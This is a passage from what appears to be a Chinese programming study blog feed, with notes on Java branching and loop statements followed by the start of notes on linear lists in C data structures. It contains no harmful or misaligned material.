class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">if</span> (条件表达式) &#123;<br> 执行代码块;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (条件表达式<span class="hljs-number">2</span>) &#123;<br> 执行代码块<span class="hljs-number">2</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (条件表达式<span class="hljs-number">3</span>) &#123;<br> 执行代码块<span class="hljs-number">3</span>;<br>&#125;<br>...<br><span class="hljs-keyword">else</span> &#123;<br> 执行代码块n；<br>&#125;<br></code></pre></td></tr></table></figure><p>特别地：多分支可以没有<code>else</code>。此时如果条件都不成立，则无执行入口</p><h3 id="嵌套分支">4.2.4 嵌套分支</h3><blockquote><p>在一个分支结构中又完整嵌套了另一个完整的分支结构。里面的分支称为内层分支，外面的分支称为外层分支。</p></blockquote><p>Java 规定，else 子句属于逻辑上距其最近，且没有匹配 else 的 if语句</p><p><strong>规范：嵌套尽量不超过 3 层（可读性不好）</strong></p><h2 id="switch-分支结构">4.3 <code>switch</code> 分支结构</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">switch</span>(表达式)&#123;<br><span class="hljs-keyword">case</span> 常量<span class="hljs-number">1</span>:<br>语句块<span class="hljs-number">1</span>;<br><span class="hljs-keyword">break</span>;<span class="hljs-comment">//break 语句可选</span><br><span class="hljs-keyword">case</span> 常量<span class="hljs-number">2</span>:<br>语句块<span class="hljs-number">2</span>;<br><span class="hljs-keyword">break</span>;<span class="hljs-comment">//break 语句可选</span><br>...<br><span class="hljs-keyword">default</span>:<span class="hljs-comment">//default 语句可选</span><br><span class="hljs-keyword">default</span>语句块;<br><span class="hljs-keyword">break</span>;<span class="hljs-comment">//break 语句可选</span><br>&#125;<br></code></pre></td></tr></table></figure><ol type="1"><li><code>switch</code> 关键字，表示 switch 分支。</li><li><code>表达式</code> 对应一个值。<strong>该值必须是 int 或char</strong>（char 可以转化为 int）。是 byte 或 short 的场合，要提升为int。不允许 long、double 或 float</li><li><code>case 常量1;</code> 表示：当 <code>表达式</code> 的值等于<code>常量1</code> ，则执行 <code>语句块1</code>。</li><li><code>break;</code> 表示退出 switch 分支。</li><li>当 <code>表达式</code> 的值匹配 <code>常量1</code> ，则执行<code>语句块1</code>，如果不匹配，则继续匹配 <code>常量2</code>，以此类推。</li><li>如果全都不匹配，则执行 <code>default</code>。</li><li>如果不写 <code>break;</code>，则会发生<strong>穿透</strong>，即不进行判断而继续执行下一语句块。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<span class="hljs-comment">//导入</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        请编写一个程序，该程序可以接收一个字符，比如:a,b,c,d,e,f,g</span><br><span class="hljs-comment">        a 表示星期一，b 表示星期二 …</span><br><span class="hljs-comment">        根据用户的输入显示相应的信息.要求使用 switch 语句完成</span><br><span class="hljs-comment">        思路分析</span><br><span class="hljs-comment">        1. 接收一个字符 , 创建 Scanner 对象</span><br><span class="hljs-comment">        2. 使用 switch 来完成匹配,并输出对应信息</span><br><span class="hljs-comment">        代码</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">myScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        System.out.println(<span class="hljs-string">&quot;请输入一个字符(a-c)&quot;</span>);<br>        <span class="hljs-type">char</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> myScanner.next().charAt(<span class="hljs-number">0</span>);<span class="hljs-comment">//</span><br>        <span class="hljs-comment">//在 java 中，只要是有值返回，就是一个表达式</span><br>        <span class="hljs-keyword">switch</span>(c1) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span> :<br>                System.out.println(<span class="hljs-string">&quot;今天星期一,猴子穿新衣&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span> :<br>                System.out.println(<span class="hljs-string">&quot;今天星期二,猴子当小二&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;c&#x27;</span> :<br>                System.out.println(<span class="hljs-string">&quot;今天星期三,猴子爬雪山..&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                System.out.println(<span class="hljs-string">&quot;你输入的字符不正确，没有匹配的&quot;</span>);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;退出了 switch ,继续执行程序&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="使用细节">4.3.1 使用细节</h3><ol type="1"><li>表达式数据类型，应和 <code>case</code>后的常量类型一致，或者是可以自动转换成可以比较的类型。如：输入的是<code>char</code> 而 常量是 <code>int</code></li><li>switch 中 <code>表达式</code>的返回值必须是：(<code>byte, short, int, char,enum[枚举] ,String</code>)</li><li><code>case</code>语句中的值必须是常量或常量表达式，不能是变量。</li><li><code>default</code> 是可选的。没有就不执行。</li><li><code>break;</code> 用来跳出 switch分支。如果不写，会持续执行语句，直到分支结束或遇到下一个<code>break;</code></li></ol><h3 id="与-if-else-分支结构的取舍">4.3.2 与 <code>if-else</code>分支结构的取舍</h3><ul><li>如果<strong>判断的具体数值不多</strong>，而且符合 byte、 short、int、 char, enum[枚举], String 这 6种类型。虽然两个语句都可以使用，建议使用 swtich 语句。</li><li>其他情况：对区间判断，对结果为 boolean 类型判断，使用 if，if的使用范围更广</li></ul><h2 id="for-循环控制">4.4 <code>for</code> 循环控制</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">for</span>(循环变量初始化;循环条件;循环变量迭代)&#123;<br>循环操作（代码块）;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p><code>for</code> 关键字，表示循环控制</p></li><li><p>四个要素：1. 循环变量初始化 2. 循环的条件 3. 循环的操作 4.循环变量迭代</p></li><li><p>循环操作可以有多条语句</p></li><li><p>如果循环操作只有一条语句，可以省略<code>&#123;&#125;</code>，但<strong>建议不省略</strong></p></li></ul><h3 id="使用细节-1">4.4.1 使用细节</h3><ol type="1"><li>循环条件是返回一个 boolean 值（<code>ture</code> 或<code>false</code>）的公式。</li><li><code>for(;循环条件;)&#123; &#125;</code>其中的初始化和变量迭代可以写在别处，但 <code>;</code>不能省略。如果不写在别处，那个循环变量初始化中声明的变量只能在该 for循环中使用。</li><li>控制台用 ctrl + c 强制结束一个流程</li><li>循环初始值可以有多条初始化语句，但要求类型一样，并用 <code>,</code>隔开。变量迭代也可以有多条代码，用 <code>,</code> 隔开。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,j = <span class="hljs-number">0</span>; i &lt; count; i++, j+=<span class="hljs-number">2</span>)&#123;<br>System.out.println(<span class="hljs-string">&quot;i = &quot;</span> + i + <span class="hljs-string">&quot; j = &quot;</span> + j);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="化繁为简-先死后活">4.4.2 化繁为简 先死后活</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//练习</span><br><span class="hljs-keyword">import</span> java.util.Scanner;<span class="hljs-comment">//导入</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//打印 1~100 之间所有是 9 的倍数的整数，统计个数 及 总和.[化繁为简,先死后活]</span><br>        <span class="hljs-comment">//老韩的两个编程思想(技巧)</span><br>        <span class="hljs-comment">//1. 化繁为简 : 即将复杂的需求，拆解成简单的需求，逐步完成</span><br>        <span class="hljs-comment">//2. 先死后活 : 先考虑固定的值，然后转成可以灵活变化的值</span><br>        <span class="hljs-comment">//思路分析</span><br>        <span class="hljs-comment">//打印 1~100 之间所有是 9 的倍数的整数，统计个数 及 总和</span><br>        <span class="hljs-comment">//化繁为简</span><br>        <span class="hljs-comment">//(1) 完成 输出 1-100 的值</span><br>        <span class="hljs-comment">//(2) 在输出的过程中，进行过滤，只输出 9 的倍数 i % 9 ==0</span><br>        <span class="hljs-comment">//(3) 统计个数 定义一个变量 int count = 0; 当 条件满足时 count++;</span><br>        <span class="hljs-comment">//(4) 总和 , 定义一个变量 int sum = 0; 当条件满足时累积 sum += i;</span><br>        <span class="hljs-comment">//先死后活</span><br>        <span class="hljs-comment">//(1) 为了适应更好的需求，把范围的开始的值和结束的值，做出变量</span><br>        <span class="hljs-comment">//(2) 还可以更进一步 9 倍数也做成变量 int t = 9;</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">//统计 9 的倍数个数 变量</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">//总和</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> <span class="hljs-number">200</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>; <span class="hljs-comment">// 倍数</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> start; i &lt;= end; i++) &#123;<br>            <span class="hljs-keyword">if</span>( i % t == <span class="hljs-number">0</span>) &#123;<br>                System.out.println(<span class="hljs-string">&quot;i=&quot;</span> + i);<br>                count++;<br>                sum += i;<span class="hljs-comment">//累积</span><br>            &#125;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;count=&quot;</span> + count);<br>        System.out.println(<span class="hljs-string">&quot;sum=&quot;</span> + sum);<br><br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h2 id="while-循环控制">4.5 <code>while</code> 循环控制</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">while</span>(循环条件)&#123;<br>循环体(代码块);<br>循环变量迭代;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>while</code> 也有四要素，只是位置和 <code>for</code> 不同</p><h3 id="使用细节-2">4.5.1 使用细节</h3><ol type="1"><li>循环条件是返回一个 boolean 值（<code>ture</code> 或<code>false</code>）的公式。while 循环中，循环条件不能为空。</li><li><code>while</code> 循环是先判断再执行语句。</li></ol><h2 id="do..while-循环控制">4.6 <code>do..while</code> 循环控制</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">do</span>&#123;<br>循环体;<br>循环变量迭代;<br>&#125;<span class="hljs-keyword">while</span>(循环条件);<br></code></pre></td></tr></table></figure><ol type="1"><li><code>do..while</code> 是关键字</li><li>也有四要素，位置不同</li><li>先执行，再判断。也就是说，一定会至少执行一次</li><li><strong>最后有一个 <code>;</code></strong></li><li><code>while</code> 与 <code>do..while</code>区别：“要账”<code>do..while</code>先打一顿</li></ol><h3 id="使用细节-3">4.6.1 使用细节</h3><ol type="1"><li>循环条件是返回一个 boolean 值（<code>ture</code> 或<code>false</code>）的公式。</li><li><code>do..while</code>循环是先执行再判断的语句。因此至少执行一次。</li></ol><h2 id="多重循环控制">4.7 多重循环控制</h2><ol type="1"><li>将一个循环放在另一个循环体内，就形成了嵌套循环。建议一般使用两层，最多不超过三层。</li><li>嵌套循环是把内层循环当成外层循环的循环体。只有内层<code>false</code> 时才结束当层循环。</li><li>若内层执行 n 次，外层 m 次，则合计会循环 n*m 次</li></ol><h3 id="空心金字塔问题">4.7.1 空心金字塔问题</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <br>        <span class="hljs-type">int</span> <span class="hljs-variable">totalLevel</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= totalLevel; i++)&#123;<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> totalLevel; m &gt; i; m--)&#123;<br>                System.out.print(<span class="hljs-string">&quot; &quot;</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">for</span>( <span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; j &lt;= <span class="hljs-number">2</span>*i-<span class="hljs-number">1</span>; j++)&#123;<br>                <span class="hljs-keyword">if</span> (j == <span class="hljs-number">1</span> || j == <span class="hljs-number">2</span>*i-<span class="hljs-number">1</span> || i == totalLevel) &#123;<br>                    System.out.print(<span class="hljs-string">&quot;*&quot;</span>);<br>                &#125; <span class="hljs-keyword">else</span><br>                    System.out.print(<span class="hljs-string">&quot; &quot;</span>);<br>            &#125;<br>            System.out.println(<span class="hljs-string">&quot;&quot;</span>);<br><br>        &#125;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311241736554.png"alt="image-20231124173638347" /><figcaption aria-hidden="true">image-20231124173638347</figcaption></figure><h3 id="九九乘法表问题">4.7.2 九九乘法表问题</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">9</span>; i++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; j&lt;=i; j++)&#123;<br>                System.out.print(j + <span class="hljs-string">&quot;*&quot;</span> + i +  <span class="hljs-string">&quot;=&quot;</span> + i*j + <span class="hljs-string">&quot;\t&quot;</span>);<br>            &#125;<br>            System.out.println();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311241819925.png"alt="image-20231124181958866" /><figcaption aria-hidden="true">image-20231124181958866</figcaption></figure><h2 id="跳转控制语句">4.8 跳转控制语句</h2><blockquote><p>跳转控制语句用于分支或循环中，以便程序员更好控制程序执行方向</p></blockquote><h3 id="break">4.8.1 break</h3><blockquote><p>用于中止一个语句块的执行</p></blockquote><p>语法：<code>break;</code></p><p>break 可以被用在三种场合中</p><ul><li><p>switch 语句中，以跳出判断（结束穿透）</p></li><li><p>for、while、do…while 循环语句中，以跳出循环</p></li><li><p>语句块中，以跳过本块中所有剩余语句</p><p><code>break</code> 语句出现在多层嵌套的语句块中时，可以通过<strong>标签</strong> 指明要终止的时哪一层语句块。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>:&#123;<br><span class="hljs-selector-tag">b</span>:&#123;<br>c:&#123;<br>   ...<br> berak <span class="hljs-selector-tag">b</span>;<br>&#125;<br>&#125;<br>&#125;JAVA<br></code></pre></td></tr></table></figure><ol type="1"><li><code>a:</code> <code>b:</code> <code>c:</code>是标签，名字由程序员指定</li><li><code>break</code> 后指定哪个标签就退出到哪里</li><li><strong>实际开发中，尽量不要使用标签</strong></li></ol></li></ul><h3 id="continue">4.8.3 continue</h3><blockquote><p>在循环中出现。用于结束本次循环，继续下一次循环</p></blockquote><p>语法：<code>continue;</code></p><p>进行下次循环前，仍会判断循环条件是否满足</p><p>在多层嵌套循环中，可以通过标签指出跳出哪次循环（同<code>break</code>）</p><h3 id="return">4.8.4 return</h3><blockquote><p>用于方法。表示跳出所在的方法</p></blockquote><p>语法：<code>return;</code></p><p>方法有返回值的场合，将返回值写在 return后：<code>return 值;</code></p><p>后面会再讲~</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构 2 线性表</title>
    <link href="/2023/11/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%202%20%E7%BA%BF%E6%80%A7%E8%A1%A8/"/>
    <url>/2023/11/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%202%20%E7%BA%BF%E6%80%A7%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<blockquote><p>B站王卓老师数据结构的课程学习记录</p><p>其中2.5的小结基本实现了线性表的所有功能（Vscode，c/c++）</p><p>2.6的小结基本实现了单链表的所有功能（Vscode，c/c++）</p><p>有师傅像我一样c没学好，代码有点看不懂的可以看一下2.4，王卓老师的补充讲解很友好</p><p>同时也能参考一下下面这篇文章，来进行数据结构的学习</p><p><ahref="https://www.cnblogs.com/linfangnan/p/17089709.html">数据结构个人学习推荐- 乌漆WhiteMoon - 博客园 (cnblogs.com)</a></p></blockquote><h2 id="线性表的定义和特点">2.1 线性表的定义和特点</h2><p>定义：<strong>由n(n ≥0)个数据特性相同的元素构成的有限序列称为线性表。</strong></p><p>特点：</p><ol type="1"><li>线性表中元素的个数n(n ≥ 0)定义为线性表的长度，n = 0时称为空表。</li><li>将非空的线性表(n &gt; 0)记作(a1，a2，a3，...，an)</li><li>这里的数据元素ai(1 ≤ i ≤n)只是个抽象的符号，其具体含义在不同情况下可以不同。</li><li>在非空的线性表，有且仅有一个开始结点a1,它没有直接前趋，而仅有一个直接后继a2；有且仅有一个终端结点an,它没有直接后继，而仅有一个直接前趋an-1；其余的内部结点ai,(2&lt; i &lt; n-1)都有且仅有一个直接前趋ai-1和一个直接后继ai+1</li></ol><h2 id="线性表的类型定义">2.2 线性表的类型定义</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c">ADT List &#123;<br>数据对象：D=&#123;ai| ai ∈ElemSet, i=<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,…,n, n≥<span class="hljs-number">0</span>&#125;<br>数据关系：R=&#123; &lt; ai<span class="hljs-number">-1</span> , ai&gt; | ai<span class="hljs-number">-1</span>, ai∈D, i=<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,…,n&#125; <br>基本操作： <br>InitList (&amp; L )      <br>    <span class="hljs-comment">//(Initialization) 形参或者定义时&amp;是引用，实参或者使用时&amp;是取地址！跟C语言还是C++没有关系！但是引用这个概念只存在于C++</span><br>操作结果：构造一个空的线性表L。 <br>DestroyList ( &amp;L )    <br>初始条件：线性表L已存在。     <br>操作结果：销毁线性表L。<br>ClearList ( &amp;L )   <br>初始条件：线性表L已存在。    <br>操作结果：将L重置为空表。<br>ListEmpty ( L )     <br>初始条件：线性表L已存在。     <br>操作结果：若L为空表，则返回TRUE, 否则返回FALSE。  <br>Listlenght ( L )     <br>初始条件：线性表L已存在。     <br>操作结果：返回L中数据元素个数。  <br>GetElem (L, i, &amp;e )     <br>初始条件：线性表L已存在,<span class="hljs-number">1</span> ≤i≤ListLength(L)。   <br>操作结果：用e返回L中第 i 个数据元素的值。<br>LocateElem (L, e, compare() )   <br>初始条件：线性表L已存在,compare()是数据元素判定函数。    <br>操作结果：返回L中第<span class="hljs-number">1</span>个与e满足关系compare()的数据元素的位序，  若这样的数据元素不存在，则返回值为<span class="hljs-number">0</span>。 <br>PriorElem (L, cur_e, &amp;pre_e )     <br>初始条件：线性表L已存在。     <br>操作结果：若cur_e 是L中的数据元素，且不是第一，则用pre_e返回它的前驱,否则操作失败,pre_e无定义。<br>NextElem (L, cur_e, &amp;next_e )     <br>初始条件：线性表L已存在。     <br>操作结果：若cur_e 是L中的数据元素，且不是最后一个，则用next_e返回它的后继，否则操作失败，next_e无定义。<br>ListInsert (&amp;L, i, e )     <br>初始条件：线性表L已存在,<span class="hljs-number">1</span> ≤i≤ListLength(L)+<span class="hljs-number">1</span>。<br>操作结果：在L中第i个位置之前插入新的数据元素e，L的长度加<span class="hljs-number">1</span>。 <br>ListDelete (&amp;L, i, &amp;e )     <br>初始条件：线性表L已存在且非空,<span class="hljs-number">1</span> ≤i≤ListLength(L)。     <br>操作结果：删除L的第i个数据元素，并用e返回其值，L的长度减<span class="hljs-number">1</span>。  <br>ListTraverse (L, visit () )     <br>初始条件：线性表L已存在。     <br>操作结果：依次对L的每个数据元素调用函数visit( )。一旦visit( )失败，则操作失败。   <br>&#125;ADT List<br></code></pre></td></tr></table></figure><h2 id="线性表的顺序表示">2.3 线性表的顺序表示</h2><p>把线性表中的所有元素，按照其逻辑顺序依次存储到计算机中的从指定存储位置开始的一块连续的存储空间中</p><ul><li><p>是一种紧凑结构</p></li><li><p><spanclass="math inline">\(Loc(a_{i+1})=loc(a_i)+sizeof(ElemType)\)</span></p></li><li><p>是一种<strong>随机存储</strong>的结构</p></li><li><p>通常用数组来描述顺序存储结构</p></li><li><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311070000696.png"alt="顺序表示意图" /><figcaption aria-hidden="true">顺序表示意图</figcaption></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 20   <span class="hljs-comment">//储空间初始分配量</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElemType; <span class="hljs-comment">//ElemType类型根据实际情况而定，这里假设为int</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    ElemType data[MAXSIZE];  <span class="hljs-comment">//数组存储数据元素，最大值为MAXSIZE</span><br>    <span class="hljs-type">int</span> length  <span class="hljs-comment">//线性表当前长度</span><br>&#125;SqList;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">这里，我们就发现描述顺序存储结构需要三个属性:</span><br><span class="hljs-comment">存储空间的起始位置：数组data，它的存储位置就是存储空间的存储位置</span><br><span class="hljs-comment">线性表的最大存储容量：数组长度MaxSize。</span><br><span class="hljs-comment">线性表的当前长度：length。</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure></li><li><p>计算地址只算一次与处理数据的规模无关数量级是O(1)这种运算叫<strong>随机存取</strong>。</p></li></ul><h2 id="类c语言有关操作">2.4 类c语言有关操作</h2><h3 id="元素类型说明">2.4.1 元素类型说明</h3><p>顺序表类型定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    ElemType data[];<br>    <span class="hljs-type">int</span> length<br>&#125;SqList;<span class="hljs-comment">//顺序表类型</span><br></code></pre></td></tr></table></figure><p><code>ElemType</code>是根据实际问题，你需要什么类型的数组就定义成什么，一般是根据问题定义一个结构体或者是<code>typedef char ElemType</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td 